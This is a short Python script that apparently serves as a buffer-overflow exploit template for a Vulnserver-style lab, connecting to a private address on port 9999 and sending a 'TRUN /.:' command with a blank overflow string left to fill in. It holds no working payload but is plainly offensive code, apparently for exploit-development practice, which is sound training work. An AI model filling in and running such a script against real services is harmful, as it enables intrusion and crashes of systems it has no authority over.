#!/usr/bin/python
import sys, socket

offset= "" #add overflow

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.0.44',9999)) #change ip and port 
    s.send(('TRUN /.:' + offset)) #change the target command
    s.close()
except:
    print('Error connecting to server')
    sys.exit()